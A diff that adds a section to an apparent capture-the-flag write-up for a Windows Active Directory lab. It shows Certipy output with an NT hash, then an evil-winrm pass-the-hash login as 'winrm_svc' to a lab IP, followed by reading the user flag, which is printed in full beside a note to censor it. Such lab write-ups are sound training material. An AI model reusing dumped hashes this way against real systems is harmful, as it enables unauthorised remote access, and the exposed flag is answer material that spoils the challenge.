@@ -529,6 +529,28 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
 [*] NT hash for 'ldap_svc': 22151d74ba3de931a352cba1f9393a37
 ```
 
+WinRM access as winrm_svc:
+
+```
+evil-winrm -i 10.129.131.175 -u 'winrm_svc' -H 33bd09dcd697600edf6b3a7af4875767
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\winrm_svc\Documents> ls
+
+```
+
+## User flag:
+
+```
+*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> cat user.txt
+684fe29e00f2932163aa6631db4b9d50 censor the flag
+```
 ---
 ## Privilege Escalation
 
